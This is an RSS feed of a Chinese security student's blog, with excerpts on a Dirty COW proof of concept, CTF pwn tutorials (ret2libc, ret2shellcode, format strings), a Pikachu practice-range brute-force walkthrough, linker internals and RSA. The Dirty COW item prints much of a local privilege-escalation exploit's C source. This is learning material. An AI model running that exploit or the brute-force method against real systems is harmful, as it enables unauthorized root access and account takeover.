<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Home on a39&#39;s blog</title>
    <link>http://localhost:1313/</link>
    <description>Recent content in Home on a39&#39;s blog</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-gb</language>
    <lastBuildDate>Thu, 04 Apr 2024 00:00:00 +0000</lastBuildDate><atom:link href="http://localhost:1313/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>CVE-2016-5195 DirtyCOW</title>
      <link>http://localhost:1313/posts/2024-04-04-dirtycow/</link>
      <pubDate>Thu, 04 Apr 2024 00:00:00 +0000</pubDate>
      
      <guid>http://localhost:1313/posts/2024-04-04-dirtycow/</guid>
      
      <description>PoC 修改自dirtycow.github.io #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;sys/mman.h&amp;gt; #include &amp;lt;fcntl.h&amp;gt; #include &amp;lt;pthread.h&amp;gt; #include &amp;lt;unistd.h&amp;gt; #include &amp;lt;sys/stat.h&amp;gt; #include &amp;lt;string.h&amp;gt; #include &amp;lt;stdint.h&amp;gt; void *map; int f; struct stat st; char *name; void *madviseThread(void *arg) { char *str; str = (char*)arg; int i, c = 0; for(i = 0; i &amp;lt; 100000000; i++) { c += madvise(map, 100, MADV_DONTNEED); } printf(&amp;#34;madvise %d\n\n&amp;#34;, c); } void *procselfmemThread(void *arg) { char *str; str = (char*)arg; int f = open(&amp;#34;/proc/self/mem&amp;#34;, O_RDWR); int i, c = 0; for(i = 0; i &amp;lt; 100000000; i++) { lseek(f, (uintptr_t)map, SEEK_SET); c += write(f, str, strlen(str)); } printf(&amp;#34;procselfmem %d\n\n&amp;#34;, c); } int main(int argc, char *argv[]) { if (argc &amp;lt; 3) { (void)fprintf(stderr, &amp;#34;%s\n&amp;#34;, &amp;#34;usage: dirtyc0w target_file new_content&amp;#34;); return 1; } pthread_t pth1, pth2; f = open(argv[1], O_RDONLY); fstat(f, &amp;amp;st); name = argv[1]; map = mmap(NULL, st.</description>
      
    </item>
    
    <item>
      <title>LLVM Tutor Note</title>
      <link>http://localhost:1313/posts/2024-03-31-llvm-tutor/</link>
      <pubDate>Sun, 31 Mar 2024 00:00:00 +0000</pubDate>
      
      <guid>http://localhost:1313/posts/2024-03-31-llvm-tutor/</guid>
      
      <description>本人学习banach-space/llvm-tutor的一点笔记 Environment 首先安装 LLVM-17。Ubuntu 的包版本普遍滞后，22.04 到目前只有 LLVM-14，如果想使用更现代的 LLVM-17 就需要添加第三方源（其实是因为 LLVM project 的 API 更换太频繁到现在都没稳定下来）
Ubuntu 22.04 wget -O - https://apt.llvm.org/llvm-snapshot.gpg.key | sudo apt-key add - sudo apt-add-repository &amp;#34;deb http://apt.llvm.org/jammy/ llvm-toolchain-jammy-17 main&amp;#34; sudo apt update sudo apt install -y llvm-17 llvm-17-dev llvm-17-tools clang-17 安装完就能在/usr/lib/llvm-17找到所需的头文件、库和二进制文件了
推荐给 shell 加个配置 export LLVM_DIR=/usr/lib/llvm-17 如果用的 vscode，建个.vscode后F1输入C++: Edit Configurations (UI)，加上编译器路径、Include Path 和 C++ 标准 Include Path 加上：/usr/include/llvm-17、/usr/include/llvm-c-17 HelloWorld First Taste 编译 HelloWorldPass
cd /path/to/llvm-tutor mkdir build &amp;amp;&amp;amp; cd build cmake -DLT_LLVM_INSTALL_DIR=$LLVM_DIR .</description>
      
    </item>
    
    <item>
      <title>ld-linux.so 动态链接器加载流程浅析</title>
      <link>http://localhost:1313/posts/2024-01-17-ldso/</link>
      <pubDate>Wed, 17 Jan 2024 00:00:00 +0000</pubDate>
      
      <guid>http://localhost:1313/posts/2024-01-17-ldso/</guid>
      
      <description>ld-linux.so 动态链接器加载流程浅析 ld.so 加载 本节讲解 ld.so 刚运行时的加载解析行为
参考 dl_main源码分析（一） dl_main源码分析（二） _dl_start源码分析 Linux动态库加载函数dlopen源码梳理(一) Linux动态库加载函数dlopen源码梳理(二) 动态链接4 程序员的自我修养第八章笔记 《程序员的自我修养——链接、装载与库》 调用栈 调用栈大致如下，下面只介绍其中一部分较为重要的
RTLD_START() (sysdeps/x86_64/dl-machine.h) _dl_start() (elf/rtld.c) elf_machine_load_addr() elf_get_dynamic_info() ELF_DYNAMIC_RELOCATE() (elf/dynamic-link.h) elf_machine_runtime_setup() (sysdeps/x86_64/dl-machine.h) _ELF_DYNAMIC_DO_RELOC() (sysdeps/x86_64/dl-machine.h) elf_dynamic_do_rel() (elf/do-rel.h) _dl_start_final() (elf/rtld.c) _dl_sysdep_start() (sysdeps/generic/dl-sysdeps.h) _dl_main() (elf/rtld.c) process_envvars() (elf/rtld.c) elf_get_dynamic_info() _dl_setup_hash() (elf.dl-lookup.c) _dl_new_object() (elf/dl-object.c) _dl_map_object() (elf/dl-load.c) _dl_map_object_from_fd() (elf/dl-load.c) add_name_to_object() (elf/dl-load.c) _dl_new_object() (elf/dl-object.c) map_segment() ELF_{PREFERED,FIXED}_ADDRESS() mprotect() munmap() _dl_setup_hash() (elf/dl-lookup.c) _dl_map_object_deps() (elf/dl-deps.c) preload() _dl_lookup_symbol() (elf/dl-lookup.c) do_lookup() _dl_relocate_object() (loop in elf/dl-reloc.c) _start() (main binary) 相关函数 _start（RTLD_START） ld.</description>
      
    </item>
    
    <item>
      <title>Linux 系统编程笔记</title>
      <link>http://localhost:1313/posts/2023-12-03-apue/</link>
      <pubDate>Sun, 03 Dec 2023 00:00:00 +0000</pubDate>
      
      <guid>http://localhost:1313/posts/2023-12-03-apue/</guid>
      
      <description>课程视频：Linux 系统编程 - 李慧琴老师 深入浅出，点面结合，恪守标准，爆赞 参考书目 UNIX 环境高级编程（第三版） Linux 内核设计与实现（第三版） 深入理解 Linux 内核（第三版） 参考文章 Linux系统编程学习笔记 | 来生拓己 オフィシャルサイト 标准 I/O 简介 I/O：input &amp;amp; output stdio：标准 I/O（优先使用，因为可移植性好且封装性好） sysio：系统 I/O（也叫文件 I/O） 常见标准 I/O：
打开/关闭文件 输入输出流 文件指针操作 缓存相关 fopen fgetc，fputc fseek fflush fclose fgets，fputs ftell fread，fwrite rewind printf 族，scanf 族 FILE 类型始终贯穿标准 I/O
fopen FILE *fopen(const char *path, const char *mode) path：文件路径 mode：访问权限 r：只读，文件指针定位到文件开头，要求文件必须存在 r+：可读写，文件指针定位到文件开头，要求文件必须存在 w：只写，有此文件则清空，无此文件则创建文件，文件指针定位到文件开头 w+：可读写，有此文件则清空，无此文件则创建文件，文件指针定位到文件开头 a：只写，追加到文件，无此文件则创建文件，文件指针定位到文件末尾（最后一个字节的下一个位置） a+：可读可追加（可写），无此文件则创建文件，读文件加时文件指针定位到文件开头，追加时文件指针定位到文件末尾 b：以二进制流打开，可以在以上权限后面加此权限（遵循 POSIX 的系统可以忽略，包括 Linux） 若执行成功函数返回一个 FILE 指针，失败则返回 NULL 并设置全局变量errno errno的定义在 /usr/include/asm-generic的宏中，若想使用需包含errno.</description>
      
    </item>
    
    <item>
      <title>[Hackergame 2022] 个人writeup</title>
      <link>http://localhost:1313/posts/2022-10-29-hackergame/</link>
      <pubDate>Sat, 29 Oct 2022 00:00:00 +0000</pubDate>
      
      <guid>http://localhost:1313/posts/2022-10-29-hackergame/</guid>
      
      <description>writeup 签到 乱点一下，看看地址栏
http://202.38.93.111:12022/?result=???? 显然get请求，改成result=2022就完了
flag{HappyHacking2022-13de731b72} 猫咪问答 1. 中国科学技术大学 NEBULA 战队（USTC NEBULA）是于何时成立的喵？
http://news.ustc.edu.cn/info/1047/28363.htm2017-03 2. 2022 年 9 月，中国科学技术大学学生 Linux 用户协会（LUG @ USTC）在科大校内承办了软件自由日活动。除了专注于自由撸猫的主会场之外，还有一些和技术相关的分会场（如闪电演讲 Lightning Talk）。其中在第一个闪电演讲主题里，主讲人于 slides 中展示了一张在 GNOME Wayland 下使用 Wayland 后端会出现显示问题的 KDE 程序截图，请问这个 KDE 程序的名字是什么？
https://ftp.lug.ustc.edu.cn/%E6%B4%BB%E5%8A%A8/2022.9.20_%E8%BD%AF%E4%BB%B6%E8%87%AA%E7%94%B1%E6%97%A5/slides/gnome-wayland-user-perspective.pdfhttps://apps.kde.org/zh-cn/kdenlive/Kdenlive 3. 22 年坚持，小 C 仍然使用着一台他从小用到大的 Windows 2000 计算机。那么，在不变更系统配置和程序代码的前提下，Firefox 浏览器能在 Windows 2000 下运行的最后一个大版本号是多少？
https://36kr.com/p/163969482752112 4. 你知道 PwnKit（CVE-2021-4034）喵？据可靠谣传，出题组的某位同学本来想出这样一道类似的题，但是发现 Linux 内核更新之后居然不再允许 argc 为 0 了喵！那么，请找出在 Linux 内核 master 分支（torvalds/linux.git）下，首个变动此行为的 commit 的 hash 吧喵！</description>
      
    </item>
    
    <item>
      <title>[bamboofox] ret2libc1,2,3 [CTFwiki]</title>
      <link>http://localhost:1313/posts/2022-10-19-ret2libc/</link>
      <pubDate>Wed, 19 Oct 2022 00:00:00 +0000</pubDate>
      
      <guid>http://localhost:1313/posts/2022-10-19-ret2libc/</guid>
      
      <description>ret2libc 基本原理 ret2libc即控制函数的执行libc中的函数，是本ELF文件没有的函数，通常是返回至某个函数的PLT处或者函数的具体位置 （即函数对应的 got 表项的内容）。一般情况下，我们会选择执行system(&amp;quot;/bin/sh&amp;quot;)，故而此时我们需要知道system函数的地址
看名字就知道又是一个栈溢出的利用，栈溢出就不重复讲解了，讲讲有关动态链接库的内容
动态链接库 动态链接库是一类不可执行的二进制文件，在Windows下其后缀名为.dll，在Linux下其后缀名为.so。动态链接库中主要包括了一些函数的具体实现过程以供其他程序直接调用，比如libc-2.31.so中就包含了printf、scanf等函数的具体实现，因此我们在编写自己的C语言程序时可以直接调用该函数而无需自行实现
那么动态链接库和静态链接库有什么区别呢，我们来看一个小例子
#include &amp;lt;stdio.h&amp;gt;int main(){printf(&amp;#34;Hello world!&amp;#34;);} 我们用gcc --static -o staticELF test.c和gcc -o dynamicELF test.c来对代码分别通过静态链接方式和动态链接方式进行编译得到两个ELF文件
显然两者的功能完全相同，区别就在于ELF文件的大小了，两者的大小区别不是一般的大
-rwxrwxrwx 1 asuka asuka 15952 Oct 21 00:31 dynamicELF*-rwxrwxrwx 1 asuka asuka 900264 Oct 21 00:31 staticELF* 这是因为在静态链接方式编译的程序把要用到的库函数和对应的子函数等都包含在了程序的text段中，自给自足，而动态链接方式编译的程序本身不包含库函数，而借助系统的动态链接库完成运行
静态链接和动态链接各自的优劣之处也就看出来了
静态链接编译的文件可移植性好，但体积大、相对臃肿 动态链接编译的文件体积小、运用灵活，但对系统环境依赖性强 说这些可能比较枯燥，举个很真实的例子：你一定曾经在运行Windows平台的程序的时候遇到过“DLL缺失”的奇怪问题，而网上给出的解决方案常常是把某个DLL文件放进系统文件夹里。这里DLL文件就是Windows下的动态链接库了。没有动态链接，我们下载的应用、游戏可能会比现在大几十倍不止，这可不是绝大多数用户可以承受得起的代价。可以说，动态链接库是现代操作系统的一大创举
PLT和GOT 现在我们摆脱了必须自己实现库函数的困境，但还有一个问题横亘在我们面前：我们要如何调用系统提供的库函数呢？这就不得不提ELF文件的PLT和GOT了
PLT（Procedure Linkage Table，程序链接表）、GOT（Global Offset Table，全局偏移表）是程序在链接库内定位所需函数用到的两张表。PLT被用来存储外部函数的入口点，程序通过PLT寻找外部函数；PLT存储在代码段（Code Segment）内，在运行之前就被确定不再修改；GOT被存储在数据段（Data Segment）内，与PLT不同的是，GOT表可以在程序运行的过程中被修改，PLT存储的入口点就是GOT中对应条目的函数的确切地址
等等，我们好像发现了一个不合理的地方，外部函数的内存地址存储在 GOT 而非 PLT 表内，PLT 存储的入口点又指向 GOT 的对应条目，那么程序为什么选择 PLT 而非 GOT 作为调用的入口点呢？在程序启动时确定所有外部函数的内存地址并写入 GOT 表，之后只使用 GOT 表不是更方便吗？</description>
      
    </item>
    
    <item>
      <title>[bamboofox] ret2shellcode [CTFwiki]</title>
      <link>http://localhost:1313/posts/2022-10-19-ret2shellcode/</link>
      <pubDate>Wed, 19 Oct 2022 00:00:00 +0000</pubDate>
      
      <guid>http://localhost:1313/posts/2022-10-19-ret2shellcode/</guid>
      
      <description>栈溢出 基本原理 栈溢出（Stack Overflow）指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。这是一种特定的缓冲区溢出漏洞，类似的还有堆溢出，.bss段溢出等溢出方式
关于C语言函数调用栈篇幅较长，可以参看大佬文章
C 语言函数调用栈 (一) C 语言函数调用栈 (二) 以下是一个简单的程序栈模型
在程序执行函数调用后，会将原函数的程序栈底地址ebp、返回地址retaddr压入栈中，使子程序执行完毕后重新跳转回原程序继续执行
栈空间是从高地址向低地址增长的。但是，若函数中用到了数组作为局部变量时，向数组的赋值时的增长方向是从低地址到高地址的，与栈的增长方向相反。若对未限制数组的赋值边界，则可能对数组进行恶意的越界写入，便会把栈中的数据覆盖，造成栈溢出漏洞
不难想到，攻击栈溢出漏洞的一般主要思路就是：填满变量栈空间并溢出覆盖返回地址，使子程序调用完毕后跳转至其他代码段（比如后台代码）
需要注意的是，32 位和 64 位程序有以下简单的区别
x86 函数参数在函数返回地址的上方 x64 System V AMD64 ABI（Linux、FreeBSD、macOS 等采用）中前六个整型或指针参数依次保存在RDI,RSI,RDX,RCX,R8和R9寄存器中，如果还有更多的参数的话才会保存在栈上 内存地址不能大于0x00007FFFFFFFFFFF，6 个字节长度，否则会抛出异常 栈溢出漏洞轻则可以使程序崩溃，重则可以使攻击者控制程序执行流程
此外，我们也不难发现，发生栈溢出的基本前提是
程序必须向栈上写入数据 写入的数据大小没有被良好地控制 C和C++里常见的可以被利用的函数有
输入 gets：直接读取一行，忽略\x00 scanf vscanf 输出 sprintf 字符串 strcpy：字符串复制，遇到\x00停止 strcat：字符串拼接，遇到\x00停止 bcopy ret2shellcode ret2shellcode即控制程序执行shellcode代码，是栈溢出漏洞的一种利用方法。shellcode指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的shell
一般来说，shellcode需要我们自己填充。这其实是另外一种典型的利用方法，即此时我们需要自己去填充一些可执行的代码
在栈溢出的基础上，要想执行shellcode，则需要对应的二进制程序在运行时shellcode所在的区域具有可执行权限
题目 首先还是老套路checksec看看文件信息和保护情况，这里是一个几乎没开保护的32位ELF文件
[*] &amp;#39;/mnt/c/Users/asuka/Desktop/CTF/wiki/pwn/ret2shellcode/ret2shellcode&amp;#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x8048000) RWX: Has RWX segments 拖进32位IDA里反编译一下，发现get函数，感觉可以栈溢出</description>
      
    </item>
    
    <item>
      <title>[第五空间2019 决赛] PWN5 [BUUCTF]</title>
      <link>http://localhost:1313/posts/2022-10-19-pwn5/</link>
      <pubDate>Wed, 19 Oct 2022 00:00:00 +0000</pubDate>
      
      <guid>http://localhost:1313/posts/2022-10-19-pwn5/</guid>
      
      <description>格式化字符串漏洞 先来简单讲讲什么是格式化字符串漏洞
格式化字符串和格式化字符串函数 格式化字符串（Format String）是一些程序设计语言的输入/输出库中能将字符串参数转换为另一种形式输出的函数。
格式化字符串函数则是一种可以接受可变数量的参数，并将第一个参数作为格式化字符串，根据其来解析之后的参数的函数。
举个例子，C语言中的printf函数就是一种典型的格式化字符串函数，而标准printf函数写法中第一个参数（图中标红部分）就是格式化字符串
在C和C++中常见的格式化字符串函数有
输入 scanf：从stdin中读取 输出 printf：输出到stdout fprintf：输出到指定的FILE流 vprintf：根据参数列表格式化输出到stdout vfprintf：根据参数列表格式化输出到指定 FILE 流 sprintf：输出到字符串 snprintf：输出指定字节数到字符串 vsprintf：根据参数列表格式化输出到字符串 vsnprintf：根据参数列表格式化输出指定字节到字符串 setproctitle：设置 argv syslog：输出日志 err，verr，warn，vwarn等等 C和C++格式化字符串中格式化占位符（format placeholder）的语法如下：
%[parameter][flags][field width][.precision][length]type 这里贴出维基百科里格式化字符串各占位符的详解
格式化字符串漏洞原理 基本原理 依旧以printf函数为例
进入printf函数之前程序的栈如下
00:0000│ esp 0xffffce1c —▸ 0x80491b9 (main+67) ◂— add esp, 0x20 01:0004│ 0xffffce20 —▸ 0x804a00c ◂— &amp;#39;Color %s, Number %d, Float %4.2f&amp;#39; 02:0008│ 0xffffce24 —▸ 0x804a008 ◂— 0x646572 /* &amp;#39;red&amp;#39; */ 03:000c│ 0xffffce28 ◂— 0x1e240 04:0010│ 0xffffce2c ◂— 0x51eb851f 05:0014│ 0xffffce30 ◂— 0x40091eb8 06:0018│ 0xffffce34 —▸ 0xf7fbe66c —▸ 0xf7ffdba0 —▸ 0xf7fbe780 —▸ 0xf7ffda40 ◂— .</description>
      
    </item>
    
    <item>
      <title>Pikachu靶场通关记录</title>
      <link>http://localhost:1313/posts/2022-08-28-pikachu/</link>
      <pubDate>Sun, 28 Aug 2022 00:00:00 +0000</pubDate>
      
      <guid>http://localhost:1313/posts/2022-08-28-pikachu/</guid>
      
      <description>如果发现几张图片排版不美观，其实是画廊未成功渲染，只需刷新一次就好 暴力破解 概述 “暴力破解”是一攻击具手段，在web攻击中，一般会使用这种手段对应用系统的认证信息进行获取。 其过程就是使用大量的认证信息在认证接口进行尝试登录，直到得到正确的结果。 为了提高效率，暴力破解一般会使用带有字典的工具来进行自动化操作。 理论上来说，大多数系统都是可以被暴力破解的，只要攻击者有足够强大的计算能力和时间，所以断定一个系统是否存在暴力破解漏洞，其条件也不是绝对的。 我们说一个web应用系统存在暴力破解漏洞，一般是指该web应用系统没有采用或者采用了比较弱的认证安全策略，导致其被暴力破解的“可能性”变的比较高。 这里的认证安全策略, 包括：
是否要求用户设置复杂的密码 是否每次认证都使用安全的验证码（想想你买火车票时输的验证码～）或者手机otp 是否对尝试登录的行为进行判断和限制（如：连续5次错误登录，进行账号锁定或IP地址锁定等） 是否采用了双因素认证 … … 千万不要小看暴力破解漏洞,往往这种简单粗暴的攻击方式带来的效果是超出预期的！
基本设置 首先需要配置火狐代理，使数据包通过BurpSuite的监控
代理地址127.0.0.1即为本地地址
点击靶场任意链接发送请求，打开BurpSuite代理（proxy）选项卡查看数据包是否被拦截
被拦截的数据包
可见，数据包被拦截成功，基本的配置就此完成了。
基于表单的暴力破解 打开页面，我们可以看到一个非常典型的登录页面，包含两个input元素和一个submit元素
先随便输入些什么，根据返回的信息找点线索
密码是那个数字，就是那个（掩鼻）
提交一下，复制一下返回信息
毫无疑问是错的 但是你先别急
回来看看拦截的数据（涉及隐私的一般为POST请求）
URL编码先辈会梦见赛博林檎吗（雾）
右键Send to Intruder或者Ctrl+I，观察发现只有username和password两个变量与验证相关，判断可以暴力破解。
clear默认变量，将username和password设置为要攻击的变量，攻击方式选择多字典交叉的Cluster bomb（覆盖率较高）
设置Payload，上祖传字典
所谓祖传其实是GitHub上找的（）
配置Option-Grep筛选返回信息以鉴别爆破成功的条目
还记得一开始的返回信息吗，这时候派上用场了
开始爆破！由于字典太大我就不浪费时间流量了，暂停一下查看阶段性成果
点击设置的筛选返回信息排序，可以看到admin/123456没有报错且返回值长度与众不同，尝试登录一下
爆破成功
admin/123456下面还有几个返回长度不对的账号密码，尝试登录后也不返回任何信息，应该是平台本身的bug 因为是第一次打靶所以记录得详细一些，之后会逐渐省略步骤偷懒 验证码绕过（on client） 首先依旧是非常经典的登录页面，但是多了个长相奇怪的验证码
可以思考下为什么这样的验证码生活中不常见
故意输错验证码尝试登录
可以看到验证码错误的情况下页面不发送POST请求，所以很可能验证码相关代码是写在前端的
查看页面源码
发现验证码表单和相关JavaScript源码
输入正确验证码，将POST请求数据包发送到Repeater选项卡复现，并尝试提交一个错误的验证码
可以看到只返回username or password is not exists而非验证码错误，说明验证码不会提交给后端验证
现在可以确信验证码机制是交由前端实现的了，攻击方式也就明朗了
操作验证码正确的POST请求数据包&amp;ndash;&amp;gt;Cluster bomb&amp;ndash;&amp;gt;设置username、password为变量&amp;ndash;&amp;gt;设置字典和筛选返回信息&amp;ndash;&amp;gt;Start attack
爆破成功
事后(?)翻翻后端代码，果然，源码仅对username和password做POST请求，进一步证实验证码机制完全交由前端实现（JavaScript实现）
现在也可以回答之前的问题了，这种完全由前端（JS、cookie等）实现的验证码机制根本无法保证安全，所以现今的验证码机制都交由更安全的后端来实现
验证码绕过（on server） 这次的登录页面就是生活中非常常见的形式了，验证码也是图片型的，点击或刷新都会改变验证码</description>
      
    </item>
    
    <item>
      <title>RSA加密算法（一）</title>
      <link>http://localhost:1313/posts/2022-07-29-rsa/</link>
      <pubDate>Fri, 29 Jul 2022 00:00:00 +0000</pubDate>
      
      <guid>http://localhost:1313/posts/2022-07-29-rsa/</guid>
      
      <description>本文大量使用$\LaTeX$公式，建议刷新一次使渲染更新后食用 前言 内行吹得天花乱坠、外行死活看不懂的深奥数论和其他近现代数学分支到底有什么用处？近现代数学取得的成果到底有何现实意义？数学家到底在思考什么、研究什么？这几个问题困扰了我这个数学废物很久很久。直到如今成为一名网安小白，接触了密码学之后，这个疑惑才终于散去几分。希望看了这篇关于 RSA 加密算法的介绍之后，你也能得到些许明悟。
历史杂谈 1976 年以前，人类所有的加密算法都使用同一种模式
发送方选择一种加密规则对信息进行加密 接收方使用同一种规则对信息进行解密 由于加密和解密使用同一种规则，因此这种加密算法称为“对称加密算法”。
不难看出，对称加密算法最大的弱点在于，发送和接受双方必须事先约定加密规则，此时要想保密地传递和保存密钥变得十分困难。随着计算机技术的快速发展，这个问题变得更加严峻。最著名的例子就是二战时期纳粹德国的密码系统恩尼格玛被计算机科学之父艾伦·图灵设计的机器破解。
1976 年，两位美国计算机学家 Whitfield Diffie 和 Martin Hellman，提出了一种崭新构思，可以在不直接传递密钥的情况下，完成解密。这被称为“Diffie-Hellman 密钥交换算法”。这个算法启发了其他科学家。人们认识到，加密和解密可以使用不同的规则，只要这两种规则之间存在某种对应关系即可，这样就避免了直接传递密钥。
接收方生成公钥和私钥两把密钥，其中公钥是公开的，而私钥是保密的 发送方获取公开的公钥，使用它对信息进行加密 接收方使用保密的私钥对信息进行解密 公钥加密的信息只能通过私钥解得，只要私钥不泄露，通信就是安全的。
这种加密算法称为“非对称加密算法”。
1977 年，三位数学家 Rivest、Shamir 和 Adleman（封面图）设计了一种算法，可以实现非对称加密。这种算法用他们三个人的名字命名，叫做 RSA 算法。直到现在，RSA 算法依旧是最广为使用的非对称加密算法。毫不夸张地说，只要有计算机网络的地方，就有 RSA 算法。
RSA算法非常可靠，密钥越长，它就越难破解。根据已经披露的文献，目前被破解的最长 RSA 密钥是 768 个二进制位。也就是说，长度超过 768 位的密钥，还无法破解（至少没人公开宣布）。因此可以认为，1024 位的 RSA 密钥基本安全，2048位的密钥极其安全。
数学基础 互质 若两个正整数除了 1 以外没有其他公因子，则我们称这两个数是互质关系（coprime）。注意，构成互质关系的两个数不一定是质数。
欧拉函数 先来引入一个问题：
任意给定正整数n，则在小于等于n的正整数之中，有多少个与n构成互质关系？
欧拉函数可以用来解决则个问题。
约定用$\phi(n)$来表示欧拉函数。欧拉函数本身并不复杂，下面来一步步讨论。
第一种情况 若 n=1，显然$\phi(1)=1。$
第二种情况 若 n 是质数，则$\phi(n)=n-1$。因为质数与小于它的每个数都构成互质关系。
第三种情况 若 n 是质数 p 的 k 次方，即$n=p^k$，则</description>
      
    </item>
    
    <item>
      <title>About Me</title>
      <link>http://localhost:1313/about/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>http://localhost:1313/about/</guid>
      
      <description>四体不勤 五谷不分 东张西望 一无所长
华南某高校大四在读
INTP-T，咖啡因重度依赖
Math Rock | Post-Rock | Shoegaze | Jazz Fusion
你怎么知道我去看了水中スピカ 2024 中国巡演 C | C++ | Go | Python，准备/正在学 Haskell，Rust 入门大失败
对二进制安全以及各类 Infra 感兴趣
实际本当下手 正在搬迁中，旧博客 | legacy：asuka39.top
Contact me：NTczNDcwMDQxQHFxLmNvbQ==</description>
      
    </item>
    
    <item>
      <title>Friends</title>
      <link>http://localhost:1313/friends/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>http://localhost:1313/friends/</guid>
      
      <description> 排序不分先后 : )
weyung写一些和我一样菜也能看懂的文章yring小小reR1ckNothing really matters.ta0lveonly a common student and a beginner in pwnPazurisFear neither hardship nor darknessGZTimeWalking on the Time Axis.Tel做世界的水手，奔赴所有港口～～KpwnZWrite some shit code.iulliusCogito ergo sum.欢迎交换友链
name: a39 link: asuka39.github.io avatar: https://avatars.githubusercontent.com/u/93875503?v=4 descr: 歩いても、歩いても </description>
      
    </item>
    
  </channel>
</rss>
